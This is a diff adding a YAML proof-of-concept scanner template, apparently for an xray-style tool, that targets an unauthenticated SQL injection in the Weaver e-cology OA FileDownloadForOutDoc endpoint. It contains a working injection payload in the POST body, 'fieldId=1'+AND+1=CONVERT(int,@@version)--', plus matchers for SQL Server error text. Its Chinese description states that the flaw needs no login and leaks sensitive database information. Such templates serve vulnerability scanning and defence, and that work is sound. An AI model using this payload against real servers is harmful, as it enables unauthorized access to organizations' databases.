@@ -1,0 +1,19 @@
+name: poc-yaml-weaver-ecology-filedownloadforsqli
+groups:
+  sqli:
+    - method: POST
+      path: /weaver/weaver.file.FileDownloadForOutDoc
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: >-
+        fieldId=1'+AND+1=CONVERT(int,@@version)--
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"Microsoft SQL Server") || response.body.bcontains(b"ODBC") || response.body.bcontains(b"Conversion failed") || response.body.bcontains(b"SQL"))
+detail:
+  author: L4xy
+  description: "泛微OA e-cology FileDownloadForOutDoc存在前台SQL注入漏洞，无需登录即可利用，可获取数据库敏感信息，影响e-cology 8(补丁<10.58.0)和e-cology 9"
+  links:
+    - https://github.com/Threekiii/Vulnerability-Wiki
+    - https://www.cnblogs.com（复现文章）
+  tags: sqli,weaver,ecology
